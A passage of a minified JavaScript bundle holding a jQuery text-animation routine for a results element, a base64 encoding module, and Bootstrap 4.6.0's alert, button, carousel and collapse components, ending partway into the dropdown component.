\uDEBD\uDEBF-\uDEC5\uDECE-\uDEDB\uDEE0-\uDEE8\uDEF0-\uDEF8])/g.test(l) ? u[d] = "emoji" : /^[^\x01-\x7E\xA1-\xDF]/.test(l) ? u[d] = "zenkaku" : u[d] = "symbol", s.push(d)) : u[d] = "space";
              }
              n.html(""), function e(d) {
                var l,
                  c = s.length,
                  f = a.slice(0);
                if (d > c) return n.data("animated", !1), void i.callback(n);
                for (l = Math.max(d, 0); l < c; l++) l < d + i.step ? f[s[l]] = t(u[s[l]], o) : f[s[l]] = "";
                n.text(f.join("")), setTimeout(function () {
                  e(d + 1), 1e3 / i.fps;
                }, 1e3 / i.fps), r.Z.parse(document.getElementById("shindanResult"), {
                  base: twemoji_asset
                });
              }(-i.step);
            });
          };
        }(jQuery);
      },
      9742: (e, t) => {
        "use strict";

        t.byteLength = function (e) {
          var t = s(e),
            n = t[0],
            r = t[1];
          return 3 * (n + r) / 4 - r;
        }, t.toByteArray = function (e) {
          var t,
            n,
            o = s(e),
            a = o[0],
            u = o[1],
            d = new i(function (e, t, n) {
              return 3 * (t + n) / 4 - n;
            }(0, a, u)),
            l = 0,
            c = u > 0 ? a - 4 : a;
          for (n = 0; n < c; n += 4) t = r[e.charCodeAt(n)] << 18 | r[e.charCodeAt(n + 1)] << 12 | r[e.charCodeAt(n + 2)] << 6 | r[e.charCodeAt(n + 3)], d[l++] = t >> 16 & 255, d[l++] = t >> 8 & 255, d[l++] = 255 & t;
          2 === u && (t = r[e.charCodeAt(n)] << 2 | r[e.charCodeAt(n + 1)] >> 4, d[l++] = 255 & t);
          1 === u && (t = r[e.charCodeAt(n)] << 10 | r[e.charCodeAt(n + 1)] << 4 | r[e.charCodeAt(n + 2)] >> 2, d[l++] = t >> 8 & 255, d[l++] = 255 & t);
          return d;
        }, t.fromByteArray = function (e) {
          for (var t, r = e.length, i = r % 3, o = [], a = 16383, u = 0, s = r - i; u < s; u += a) o.push(d(e, u, u + a > s ? s : u + a));
          1 === i ? (t = e[r - 1], o.push(n[t >> 2] + n[t << 4 & 63] + "==")) : 2 === i && (t = (e[r - 2] << 8) + e[r - 1], o.push(n[t >> 10] + n[t >> 4 & 63] + n[t << 2 & 63] + "="));
          return o.join("");
        };
        for (var n = [], r = [], i = "undefined" != typeof Uint8Array ? Uint8Array : Array, o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", a = 0, u = o.length; a < u; ++a) n[a] = o[a], r[o.charCodeAt(a)] = a;
        function s(e) {
          var t = e.length;
          if (t % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
          var n = e.indexOf("=");
          return -1 === n && (n = t), [n, n === t ? 0 : 4 - n % 4];
        }
        function d(e, t, r) {
          for (var i, o, a = [], u = t; u < r; u += 3) i = (e[u] << 16 & 16711680) + (e[u + 1] << 8 & 65280) + (255 & e[u + 2]), a.push(n[(o = i) >> 18 & 63] + n[o >> 12 & 63] + n[o >> 6 & 63] + n[63 & o]);
          return a.join("");
        }
        r["-".charCodeAt(0)] = 62, r["_".charCodeAt(0)] = 63;
      },
      3734: function (e, t, n) {
        !function (e, t, n) {
          "use strict";

          function r(e) {
            return e && "object" == typeof e && "default" in e ? e : {
              default: e
            };
          }
          var i = r(t),
            o = r(n);
          function a(e, t) {
            for (var n = 0; n < t.length; n++) {
              var r = t[n];
              r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r);
            }
          }
          function u(e, t, n) {
            return t && a(e.prototype, t), n && a(e, n), e;
          }
          function s() {
            return s = Object.assign || function (e) {
              for (var t = 1; t < arguments.length; t++) {
                var n = arguments[t];
                for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
              }
              return e;
            }, s.apply(this, arguments);
          }
          function d(e, t) {
            e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t;
          }
          var l = "transitionend",
            c = 1e6,
            f = 1e3;
          function h(e) {
            return null == e ? "" + e : {}.toString.call(e).match(/\s([a-z]+)/i)[1].toLowerCase();
          }
          function p() {
            return {
              bindType: l,
              delegateType: l,
              handle: function (e) {
                if (i.default(e.target).is(this)) return e.handleObj.handler.apply(this, arguments);
              }
            };
          }
          function m(e) {
            var t = this,
              n = !1;
            return i.default(this).one(v.TRANSITION_END, function () {
              n = !0;
            }), setTimeout(function () {
              n || v.triggerTransitionEnd(t);
            }, e), this;
          }
          function g() {
            i.default.fn.emulateTransitionEnd = m, i.default.event.special[v.TRANSITION_END] = p();
          }
          var v = {
            TRANSITION_END: "bsTransitionEnd",
            getUID: function (e) {
              do {
                e += ~~(Math.random() * c);
              } while (document.getElementById(e));
              return e;
            },
            getSelectorFromElement: function (e) {
              var t = e.getAttribute("data-target");
              if (!t || "#" === t) {
                var n = e.getAttribute("href");
                t = n && "#" !== n ? n.trim() : "";
              }
              try {
                return document.querySelector(t) ? t : null;
              } catch (e) {
                return null;
              }
            },
            getTransitionDurationFromElement: function (e) {
              if (!e) return 0;
              var t = i.default(e).css("transition-duration"),
                n = i.default(e).css("transition-delay"),
                r = parseFloat(t),
                o = parseFloat(n);
              return r || o ? (t = t.split(",")[0], n = n.split(",")[0], (parseFloat(t) + parseFloat(n)) * f) : 0;
            },
            reflow: function (e) {
              return e.offsetHeight;
            },
            triggerTransitionEnd: function (e) {
              i.default(e).trigger(l);
            },
            supportsTransitionEnd: function () {
              return Boolean(l);
            },
            isElement: function (e) {
              return (e[0] || e).nodeType;
            },
            typeCheckConfig: function (e, t, n) {
              for (var r in n) if (Object.prototype.hasOwnProperty.call(n, r)) {
                var i = n[r],
                  o = t[r],
                  a = o && v.isElement(o) ? "element" : h(o);
                if (!new RegExp(i).test(a)) throw new Error(e.toUpperCase() + ': Option "' + r + '" provided type "' + a + '" but expected type "' + i + '".');
              }
            },
            findShadowRoot: function (e) {
              if (!document.documentElement.attachShadow) return null;
              if ("function" == typeof e.getRootNode) {
                var t = e.getRootNode();
                return t instanceof ShadowRoot ? t : null;
              }
              return e instanceof ShadowRoot ? e : e.parentNode ? v.findShadowRoot(e.parentNode) : null;
            },
            jQueryDetection: function () {
              if (void 0 === i.default) throw new TypeError("Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript.");
              var e = i.default.fn.jquery.split(" ")[0].split("."),
                t = 1,
                n = 2,
                r = 9,
                o = 1,
                a = 4;
              if (e[0] < n && e[1] < r || e[0] === t && e[1] === r && e[2] < o || e[0] >= a) throw new Error("Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0");
            }
          };
          v.jQueryDetection(), g();
          var y = "alert",
            b = "4.6.0",
            w = "bs.alert",
            _ = "." + w,
            E = ".data-api",
            x = i.default.fn[y],
            T = '[data-dismiss="alert"]',
            C = "close" + _,
            S = "closed" + _,
            D = "click" + _ + E,
            A = "alert",
            $ = "fade",
            k = "show",
            N = function () {
              function e(e) {
                this._element = e;
              }
              var t = e.prototype;
              return t.close = function (e) {
                var t = this._element;
                e && (t = this._getRootElement(e)), this._triggerCloseEvent(t).isDefaultPrevented() || this._removeElement(t);
              }, t.dispose = function () {
                i.default.removeData(this._element, w), this._element = null;
              }, t._getRootElement = function (e) {
                var t = v.getSelectorFromElement(e),
                  n = !1;
                return t && (n = document.querySelector(t)), n || (n = i.default(e).closest("." + A)[0]), n;
              }, t._triggerCloseEvent = function (e) {
                var t = i.default.Event(C);
                return i.default(e).trigger(t), t;
              }, t._removeElement = function (e) {
                var t = this;
                if (i.default(e).removeClass(k), i.default(e).hasClass($)) {
                  var n = v.getTransitionDurationFromElement(e);
                  i.default(e).one(v.TRANSITION_END, function (n) {
                    return t._destroyElement(e, n);
                  }).emulateTransitionEnd(n);
                } else this._destroyElement(e);
              }, t._destroyElement = function (e) {
                i.default(e).detach().trigger(S).remove();
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this),
                    r = n.data(w);
                  r || (r = new e(this), n.data(w, r)), "close" === t && r[t](this);
                });
              }, e._handleDismiss = function (e) {
                return function (t) {
                  t && t.preventDefault(), e.close(this);
                };
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return b;
                }
              }]), e;
            }();
          i.default(document).on(D, T, N._handleDismiss(new N())), i.default.fn[y] = N._jQueryInterface, i.default.fn[y].Constructor = N, i.default.fn[y].noConflict = function () {
            return i.default.fn[y] = x, N._jQueryInterface;
          };
          var O = "button",
            j = "4.6.0",
            R = "bs.button",
            P = "." + R,
            L = ".data-api",
            I = i.default.fn[O],
            F = "active",
            B = "btn",
            M = "focus",
            U = '[data-toggle^="button"]',
            q = '[data-toggle="buttons"]',
            H = '[data-toggle="button"]',
            W = '[data-toggle="buttons"] .btn',
            z = 'input:not([type="hidden"])',
            Y = ".active",
            V = ".btn",
            Q = "click" + P + L,
            X = "focus" + P + L + " blur" + P + L,
            K = "load" + P + L,
            J = function () {
              function e(e) {
                this._element = e, this.shouldAvoidTriggerChange = !1;
              }
              var t = e.prototype;
              return t.toggle = function () {
                var e = !0,
                  t = !0,
                  n = i.default(this._element).closest(q)[0];
                if (n) {
                  var r = this._element.querySelector(z);
                  if (r) {
                    if ("radio" === r.type) if (r.checked && this._element.classList.contains(F)) e = !1;else {
                      var o = n.querySelector(Y);
                      o && i.default(o).removeClass(F);
                    }
                    e && ("checkbox" !== r.type && "radio" !== r.type || (r.checked = !this._element.classList.contains(F)), this.shouldAvoidTriggerChange || i.default(r).trigger("change")), r.focus(), t = !1;
                  }
                }
                this._element.hasAttribute("disabled") || this._element.classList.contains("disabled") || (t && this._element.setAttribute("aria-pressed", !this._element.classList.contains(F)), e && i.default(this._element).toggleClass(F));
              }, t.dispose = function () {
                i.default.removeData(this._element, R), this._element = null;
              }, e._jQueryInterface = function (t, n) {
                return this.each(function () {
                  var r = i.default(this),
                    o = r.data(R);
                  o || (o = new e(this), r.data(R, o)), o.shouldAvoidTriggerChange = n, "toggle" === t && o[t]();
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return j;
                }
              }]), e;
            }();
          i.default(document).on(Q, U, function (e) {
            var t = e.target,
              n = t;
            if (i.default(t).hasClass(B) || (t = i.default(t).closest(V)[0]), !t || t.hasAttribute("disabled") || t.classList.contains("disabled")) e.preventDefault();else {
              var r = t.querySelector(z);
              if (r && (r.hasAttribute("disabled") || r.classList.contains("disabled"))) return void e.preventDefault();
              "INPUT" !== n.tagName && "LABEL" === t.tagName || J._jQueryInterface.call(i.default(t), "toggle", "INPUT" === n.tagName);
            }
          }).on(X, U, function (e) {
            var t = i.default(e.target).closest(V)[0];
            i.default(t).toggleClass(M, /^focus(in)?$/.test(e.type));
          }), i.default(window).on(K, function () {
            for (var e = [].slice.call(document.querySelectorAll(W)), t = 0, n = e.length; t < n; t++) {
              var r = e[t],
                i = r.querySelector(z);
              i.checked || i.hasAttribute("checked") ? r.classList.add(F) : r.classList.remove(F);
            }
            for (var o = 0, a = (e = [].slice.call(document.querySelectorAll(H))).length; o < a; o++) {
              var u = e[o];
              "true" === u.getAttribute("aria-pressed") ? u.classList.add(F) : u.classList.remove(F);
            }
          }), i.default.fn[O] = J._jQueryInterface, i.default.fn[O].Constructor = J, i.default.fn[O].noConflict = function () {
            return i.default.fn[O] = I, J._jQueryInterface;
          };
          var G = "carousel",
            Z = "4.6.0",
            ee = "bs.carousel",
            te = "." + ee,
            ne = ".data-api",
            re = i.default.fn[G],
            ie = 37,
            oe = 39,
            ae = 500,
            ue = 40,
            se = {
              interval: 5e3,
              keyboard: !0,
              slide: !1,
              pause: "hover",
              wrap: !0,
              touch: !0
            },
            de = {
              interval: "(number|boolean)",
              keyboard: "boolean",
              slide: "(boolean|string)",
              pause: "(string|boolean)",
              wrap: "boolean",
              touch: "boolean"
            },
            le = "next",
            ce = "prev",
            fe = "left",
            he = "right",
            pe = "slide" + te,
            me = "slid" + te,
            ge = "keydown" + te,
            ve = "mouseenter" + te,
            ye = "mouseleave" + te,
            be = "touchstart" + te,
            we = "touchmove" + te,
            _e = "touchend" + te,
            Ee = "pointerdown" + te,
            xe = "pointerup" + te,
            Te = "dragstart" + te,
            Ce = "load" + te + ne,
            Se = "click" + te + ne,
            De = "carousel",
            Ae = "active",
            $e = "slide",
            ke = "carousel-item-right",
            Ne = "carousel-item-left",
            Oe = "carousel-item-next",
            je = "carousel-item-prev",
            Re = "pointer-event",
            Pe = ".active",
            Le = ".active.carousel-item",
            Ie = ".carousel-item",
            Fe = ".carousel-item img",
            Be = ".carousel-item-next, .carousel-item-prev",
            Me = ".carousel-indicators",
            Ue = "[data-slide], [data-slide-to]",
            qe = '[data-ride="carousel"]',
            He = {
              TOUCH: "touch",
              PEN: "pen"
            },
            We = function () {
              function e(e, t) {
                this._items = null, this._interval = null, this._activeElement = null, this._isPaused = !1, this._isSliding = !1, this.touchTimeout = null, this.touchStartX = 0, this.touchDeltaX = 0, this._config = this._getConfig(t), this._element = e, this._indicatorsElement = this._element.querySelector(Me), this._touchSupported = "ontouchstart" in document.documentElement || navigator.maxTouchPoints > 0, this._pointerEvent = Boolean(window.PointerEvent || window.MSPointerEvent), this._addEventListeners();
              }
              var t = e.prototype;
              return t.next = function () {
                this._isSliding || this._slide(le);
              }, t.nextWhenVisible = function () {
                var e = i.default(this._element);
                !document.hidden && e.is(":visible") && "hidden" !== e.css("visibility") && this.next();
              }, t.prev = function () {
                this._isSliding || this._slide(ce);
              }, t.pause = function (e) {
                e || (this._isPaused = !0), this._element.querySelector(Be) && (v.triggerTransitionEnd(this._element), this.cycle(!0)), clearInterval(this._interval), this._interval = null;
              }, t.cycle = function (e) {
                e || (this._isPaused = !1), this._interval && (clearInterval(this._interval), this._interval = null), this._config.interval && !this._isPaused && (this._updateInterval(), this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval));
              }, t.to = function (e) {
                var t = this;
                this._activeElement = this._element.querySelector(Le);
                var n = this._getItemIndex(this._activeElement);
                if (!(e > this._items.length - 1 || e < 0)) if (this._isSliding) i.default(this._element).one(me, function () {
                  return t.to(e);
                });else {
                  if (n === e) return this.pause(), void this.cycle();
                  var r = e > n ? le : ce;
                  this._slide(r, this._items[e]);
                }
              }, t.dispose = function () {
                i.default(this._element).off(te), i.default.removeData(this._element, ee), this._items = null, this._config = null, this._element = null, this._interval = null, this._isPaused = null, this._isSliding = null, this._activeElement = null, this._indicatorsElement = null;
              }, t._getConfig = function (e) {
                return e = s({}, se, e), v.typeCheckConfig(G, e, de), e;
              }, t._handleSwipe = function () {
                var e = Math.abs(this.touchDeltaX);
                if (!(e <= ue)) {
                  var t = e / this.touchDeltaX;
                  this.touchDeltaX = 0, t > 0 && this.prev(), t < 0 && this.next();
                }
              }, t._addEventListeners = function () {
                var e = this;
                this._config.keyboard && i.default(this._element).on(ge, function (t) {
                  return e._keydown(t);
                }), "hover" === this._config.pause && i.default(this._element).on(ve, function (t) {
                  return e.pause(t);
                }).on(ye, function (t) {
                  return e.cycle(t);
                }), this._config.touch && this._addTouchEventListeners();
              }, t._addTouchEventListeners = function () {
                var e = this;
                if (this._touchSupported) {
                  var t = function (t) {
                      e._pointerEvent && He[t.originalEvent.pointerType.toUpperCase()] ? e.touchStartX = t.originalEvent.clientX : e._pointerEvent || (e.touchStartX = t.originalEvent.touches[0].clientX);
                    },
                    n = function (t) {
                      t.originalEvent.touches && t.originalEvent.touches.length > 1 ? e.touchDeltaX = 0 : e.touchDeltaX = t.originalEvent.touches[0].clientX - e.touchStartX;
                    },
                    r = function (t) {
                      e._pointerEvent && He[t.originalEvent.pointerType.toUpperCase()] && (e.touchDeltaX = t.originalEvent.clientX - e.touchStartX), e._handleSwipe(), "hover" === e._config.pause && (e.pause(), e.touchTimeout && clearTimeout(e.touchTimeout), e.touchTimeout = setTimeout(function (t) {
                        return e.cycle(t);
                      }, ae + e._config.interval));
                    };
                  i.default(this._element.querySelectorAll(Fe)).on(Te, function (e) {
                    return e.preventDefault();
                  }), this._pointerEvent ? (i.default(this._element).on(Ee, function (e) {
                    return t(e);
                  }), i.default(this._element).on(xe, function (e) {
                    return r(e);
                  }), this._element.classList.add(Re)) : (i.default(this._element).on(be, function (e) {
                    return t(e);
                  }), i.default(this._element).on(we, function (e) {
                    return n(e);
                  }), i.default(this._element).on(_e, function (e) {
                    return r(e);
                  }));
                }
              }, t._keydown = function (e) {
                if (!/input|textarea/i.test(e.target.tagName)) switch (e.which) {
                  case ie:
                    e.preventDefault(), this.prev();
                    break;
                  case oe:
                    e.preventDefault(), this.next();
                }
              }, t._getItemIndex = function (e) {
                return this._items = e && e.parentNode ? [].slice.call(e.parentNode.querySelectorAll(Ie)) : [], this._items.indexOf(e);
              }, t._getItemByDirection = function (e, t) {
                var n = e === le,
                  r = e === ce,
                  i = this._getItemIndex(t),
                  o = this._items.length - 1;
                if ((r && 0 === i || n && i === o) && !this._config.wrap) return t;
                var a = (i + (e === ce ? -1 : 1)) % this._items.length;
                return -1 === a ? this._items[this._items.length - 1] : this._items[a];
              }, t._triggerSlideEvent = function (e, t) {
                var n = this._getItemIndex(e),
                  r = this._getItemIndex(this._element.querySelector(Le)),
                  o = i.default.Event(pe, {
                    relatedTarget: e,
                    direction: t,
                    from: r,
                    to: n
                  });
                return i.default(this._element).trigger(o), o;
              }, t._setActiveIndicatorElement = function (e) {
                if (this._indicatorsElement) {
                  var t = [].slice.call(this._indicatorsElement.querySelectorAll(Pe));
                  i.default(t).removeClass(Ae);
                  var n = this._indicatorsElement.children[this._getItemIndex(e)];
                  n && i.default(n).addClass(Ae);
                }
              }, t._updateInterval = function () {
                var e = this._activeElement || this._element.querySelector(Le);
                if (e) {
                  var t = parseInt(e.getAttribute("data-interval"), 10);
                  t ? (this._config.defaultInterval = this._config.defaultInterval || this._config.interval, this._config.interval = t) : this._config.interval = this._config.defaultInterval || this._config.interval;
                }
              }, t._slide = function (e, t) {
                var n,
                  r,
                  o,
                  a = this,
                  u = this._element.querySelector(Le),
                  s = this._getItemIndex(u),
                  d = t || u && this._getItemByDirection(e, u),
                  l = this._getItemIndex(d),
                  c = Boolean(this._interval);
                if (e === le ? (n = Ne, r = Oe, o = fe) : (n = ke, r = je, o = he), d && i.default(d).hasClass(Ae)) this._isSliding = !1;else if (!this._triggerSlideEvent(d, o).isDefaultPrevented() && u && d) {
                  this._isSliding = !0, c && this.pause(), this._setActiveIndicatorElement(d), this._activeElement = d;
                  var f = i.default.Event(me, {
                    relatedTarget: d,
                    direction: o,
                    from: s,
                    to: l
                  });
                  if (i.default(this._element).hasClass($e)) {
                    i.default(d).addClass(r), v.reflow(d), i.default(u).addClass(n), i.default(d).addClass(n);
                    var h = v.getTransitionDurationFromElement(u);
                    i.default(u).one(v.TRANSITION_END, function () {
                      i.default(d).removeClass(n + " " + r).addClass(Ae), i.default(u).removeClass(Ae + " " + r + " " + n), a._isSliding = !1, setTimeout(function () {
                        return i.default(a._element).trigger(f);
                      }, 0);
                    }).emulateTransitionEnd(h);
                  } else i.default(u).removeClass(Ae), i.default(d).addClass(Ae), this._isSliding = !1, i.default(this._element).trigger(f);
                  c && this.cycle();
                }
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this).data(ee),
                    r = s({}, se, i.default(this).data());
                  "object" == typeof t && (r = s({}, r, t));
                  var o = "string" == typeof t ? t : r.slide;
                  if (n || (n = new e(this, r), i.default(this).data(ee, n)), "number" == typeof t) n.to(t);else if ("string" == typeof o) {
                    if (void 0 === n[o]) throw new TypeError('No method named "' + o + '"');
                    n[o]();
                  } else r.interval && r.ride && (n.pause(), n.cycle());
                });
              }, e._dataApiClickHandler = function (t) {
                var n = v.getSelectorFromElement(this);
                if (n) {
                  var r = i.default(n)[0];
                  if (r && i.default(r).hasClass(De)) {
                    var o = s({}, i.default(r).data(), i.default(this).data()),
                      a = this.getAttribute("data-slide-to");
                    a && (o.interval = !1), e._jQueryInterface.call(i.default(r), o), a && i.default(r).data(ee).to(a), t.preventDefault();
                  }
                }
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return Z;
                }
              }, {
                key: "Default",
                get: function () {
                  return se;
                }
              }]), e;
            }();
          i.default(document).on(Se, Ue, We._dataApiClickHandler), i.default(window).on(Ce, function () {
            for (var e = [].slice.call(document.querySelectorAll(qe)), t = 0, n = e.length; t < n; t++) {
              var r = i.default(e[t]);
              We._jQueryInterface.call(r, r.data());
            }
          }), i.default.fn[G] = We._jQueryInterface, i.default.fn[G].Constructor = We, i.default.fn[G].noConflict = function () {
            return i.default.fn[G] = re, We._jQueryInterface;
          };
          var ze = "collapse",
            Ye = "4.6.0",
            Ve = "bs.collapse",
            Qe = "." + Ve,
            Xe = ".data-api",
            Ke = i.default.fn[ze],
            Je = {
              toggle: !0,
              parent: ""
            },
            Ge = {
              toggle: "boolean",
              parent: "(string|element)"
            },
            Ze = "show" + Qe,
            et = "shown" + Qe,
            tt = "hide" + Qe,
            nt = "hidden" + Qe,
            rt = "click" + Qe + Xe,
            it = "show",
            ot = "collapse",
            at = "collapsing",
            ut = "collapsed",
            st = "width",
            dt = "height",
            lt = ".show, .collapsing",
            ct = '[data-toggle="collapse"]',
            ft = function () {
              function e(e, t) {
                this._isTransitioning = !1, this._element = e, this._config = this._getConfig(t), this._triggerArray = [].slice.call(document.querySelectorAll('[data-toggle="collapse"][href="#' + e.id + '"],[data-toggle="collapse"][data-target="#' + e.id + '"]'));
                for (var n = [].slice.call(document.querySelectorAll(ct)), r = 0, i = n.length; r < i; r++) {
                  var o = n[r],
                    a = v.getSelectorFromElement(o),
                    u = [].slice.call(document.querySelectorAll(a)).filter(function (t) {
                      return t === e;
                    });
                  null !== a && u.length > 0 && (this._selector = a, this._triggerArray.push(o));
                }
                this._parent = this._config.parent ? this._getParent() : null, this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle();
              }
              var t = e.prototype;
              return t.toggle = function () {
                i.default(this._element).hasClass(it) ? this.hide() : this.show();
              }, t.show = function () {
                var t,
                  n,
                  r = this;
                if (!(this._isTransitioning || i.default(this._element).hasClass(it) || (this._parent && 0 === (t = [].slice.call(this._parent.querySelectorAll(lt)).filter(function (e) {
                  return "string" == typeof r._config.parent ? e.getAttribute("data-parent") === r._config.parent : e.classList.contains(ot);
                })).length && (t = null), t && (n = i.default(t).not(this._selector).data(Ve)) && n._isTransitioning))) {
                  var o = i.default.Event(Ze);
                  if (i.default(this._element).trigger(o), !o.isDefaultPrevented()) {
                    t && (e._jQueryInterface.call(i.default(t).not(this._selector), "hide"), n || i.default(t).data(Ve, null));
                    var a = this._getDimension();
                    i.default(this._element).removeClass(ot).addClass(at), this._element.style[a] = 0, this._triggerArray.length && i.default(this._triggerArray).removeClass(ut).attr("aria-expanded", !0), this.setTransitioning(!0);
                    var u = function () {
                        i.default(r._element).removeClass(at).addClass(ot + " " + it), r._element.style[a] = "", r.setTransitioning(!1), i.default(r._element).trigger(et);
                      },
                      s = "scroll" + (a[0].toUpperCase() + a.slice(1)),
                      d = v.getTransitionDurationFromElement(this._element);
                    i.default(this._element).one(v.TRANSITION_END, u).emulateTransitionEnd(d), this._element.style[a] = this._element[s] + "px";
                  }
                }
              }, t.hide = function () {
                var e = this;
                if (!this._isTransitioning && i.default(this._element).hasClass(it)) {
                  var t = i.default.Event(tt);
                  if (i.default(this._element).trigger(t), !t.isDefaultPrevented()) {
                    var n = this._getDimension();
                    this._element.style[n] = this._element.getBoundingClientRect()[n] + "px", v.reflow(this._element), i.default(this._element).addClass(at).removeClass(ot + " " + it);
                    var r = this._triggerArray.length;
                    if (r > 0) for (var o = 0; o < r; o++) {
                      var a = this._triggerArray[o],
                        u = v.getSelectorFromElement(a);
                      null !== u && (i.default([].slice.call(document.querySelectorAll(u))).hasClass(it) || i.default(a).addClass(ut).attr("aria-expanded", !1));
                    }
                    this.setTransitioning(!0);
                    var s = function () {
                      e.setTransitioning(!1), i.default(e._element).removeClass(at).addClass(ot).trigger(nt);
                    };
                    this._element.style[n] = "";
                    var d = v.getTransitionDurationFromElement(this._element);
                    i.default(this._element).one(v.TRANSITION_END, s).emulateTransitionEnd(d);
                  }
                }
              }, t.setTransitioning = function (e) {
                this._isTransitioning = e;
              }, t.dispose = function () {
                i.default.removeData(this._element, Ve), this._config = null, this._parent = null, this._element = null, this._triggerArray = null, this._isTransitioning = null;
              }, t._getConfig = function (e) {
                return (e = s({}, Je, e)).toggle = Boolean(e.toggle), v.typeCheckConfig(ze, e, Ge), e;
              }, t._getDimension = function () {
                return i.default(this._element).hasClass(st) ? st : dt;
              }, t._getParent = function () {
                var t,
                  n = this;
                v.isElement(this._config.parent) ? (t = this._config.parent, void 0 !== this._config.parent.jquery && (t = this._config.parent[0])) : t = document.querySelector(this._config.parent);
                var r = '[data-toggle="collapse"][data-parent="' + this._config.parent + '"]',
                  o = [].slice.call(t.querySelectorAll(r));
                return i.default(o).each(function (t, r) {
                  n._addAriaAndCollapsedClass(e._getTargetFromElement(r), [r]);
                }), t;
              }, t._addAriaAndCollapsedClass = function (e, t) {
                var n = i.default(e).hasClass(it);
                t.length && i.default(t).toggleClass(ut, !n).attr("aria-expanded", n);
              }, e._getTargetFromElement = function (e) {
                var t = v.getSelectorFromElement(e);
                return t ? document.querySelector(t) : null;
              }, e._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = i.default(this),
                    r = n.data(Ve),
                    o = s({}, Je, n.data(), "object" == typeof t && t ? t : {});
                  if (!r && o.toggle && "string" == typeof t && /show|hide/.test(t) && (o.toggle = !1), r || (r = new e(this, o), n.data(Ve, r)), "string" == typeof t) {
                    if (void 0 === r[t]) throw new TypeError('No method named "' + t + '"');
                    r[t]();
                  }
                });
              }, u(e, null, [{
                key: "VERSION",
                get: function () {
                  return Ye;
                }
              }, {
                key: "Default",
                get: function () {
                  return Je;
                }
              }]), e;
            }();
          i.default(document).on(rt, ct, function (e) {
            "A" === e.currentTarget.tagName && e.preventDefault();
            var t = i.default(this),
              n = v.getSelectorFromElement(this),
              r = [].slice.call(document.querySelectorAll(n));
            i.default(r).each(function () {
              var e = i.default(this),
                n = e.data(Ve) ? "toggle" : t.data();
              ft._jQueryInterface.call(e, n);
            });
          }), i.default.fn[ze] = ft._jQueryInterface, i.default.fn[ze].Constructor = ft, i.default.fn[ze].noConflict = function () {
            return i.default.fn[ze] = Ke, ft._jQueryInterface;
          };
          var ht = "dropdown",
            pt = "4.6.0",
            mt = "bs.dropdown",
            gt = "." + mt,
            vt = ".data-api",
            yt = i.default.fn[ht],
            bt = 27,
            wt = 32,
            _t = 9,
            Et = 38,
            xt = 40,
            Tt = 3,
            Ct = new RegExp(Et + "|" + xt + "|" + bt),
            St = "hide" + gt,
            Dt = "hidden" + gt,
            At = "show" + gt,
            $t = "shown" + gt,
            kt = "click" + gt,
            Nt = "click" + gt + vt,
            Ot = "keydown" + gt + vt,
            jt = "keyup" + gt + vt,
            Rt = "disabled",
            Pt = "show",
            Lt = "dropup",
            It = "dropright",
            Ft = "dropleft",
            Bt = "dropdown-menu-right",
            Mt = "position-static",
            Ut = '[data-toggle="dropdown"]',
            qt = ".dropdown form",
            Ht = ".dropdown-menu",
            Wt = ".navbar-nav",
            zt = ".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)",
            Yt = "top-start",
            Vt = "top-end",
            Qt = "bottom-start",
            Xt = "bottom-end",
            Kt = "right-start",
            Jt = "left-start",
            Gt = {
              offset: 0,
              flip: !0,
              boundary: "scrollParent",
              reference: "toggle",
              display: "dynamic",
              popperConfig: null
            },
            Zt = {
              offset: "(number|string|function)",
              flip: "boolean",
              boundary: "(string|element)",
              reference: "(string|element)",
              display: "string",
              popperConfig: "(null|object)"
            },
            en = function () {
              function e(e, t) {
                this._element = e, this._popper = null, this._config = this._getConfig(t), this._menu = this._getMenuElement(), this._inNavbar = this._detectNavbar(), this._addEventListeners();
              }
              var t = e.prototype;
              return t.toggle = function () {
                if (!this._element.disabled && !i.default(this._element).hasClass(Rt)) {
                  var t = i.default(this._menu).hasClass(Pt);
                  e._clearMenus(), t || this.show(!0);
                }
              }, t.show = function (t) {
                if (void 0 === t && (t = !1), !(this._element.disabled || i.default(this._element).hasClass(Rt) || i.default(this._menu).hasClass(Pt))) {
                  var n = {
                      relatedTarget: this._element
                    },
                    r = i.default.Event(At, n),
                    a = e._getParentFromElement(this._element);
                  if (i.default(a).trigger(r), !r.isDefaultPrevented()) {
                    if (!this._inNavbar && t) {
                      if (void 0 === o.default) throw new TypeError("Bootstrap's dropdowns require Popper (https://popper.js.org)");
                      var u = this._element;
                      "parent" === this._config.reference ? u = a : v.isElement(this._config.reference) && (u = this._config.reference, void 0 !== this._config.reference.jquery && (u = this._config.reference[0])), "scrollParent" !== this._config.boundary && i.default(a).addClass(Mt), this._popper = new o.default(u, this._menu, this._getPopperConfig());
                    }
                    "ontouchstart" in document.documentElement && 0 === i.default(a).closest(Wt).length && i.default(document.body).children().on("mouseover", null, i.default.noop), this._element.focus(), this._element.setAttribute("aria-expanded", !0), i.default(this._menu).toggleClass(Pt), i.default(a).toggleClass(Pt).trigger(i.default.Event($t, n));
                  }
                }
              }, t.hide = function () {
                if (!this._element.disabled && !i.default(this._element).hasClass(Rt) && i.default(this._menu).hasClass(Pt)) {
                  var t = {
                      relatedTarget: this._element
                    },
                    n = i.default.Event(St, t),
                    r = e._getParentFromElement(this._element);
                  i.default(r).trigger(n), n.isDefaultPrevented() || (this._popper && this._popper.destroy(), i.default(this._menu).toggleClass(Pt), i.default(r).toggleClass(Pt).trigger(i.default.Event(Dt, t)));
                }
              }, t.dispose = function () {
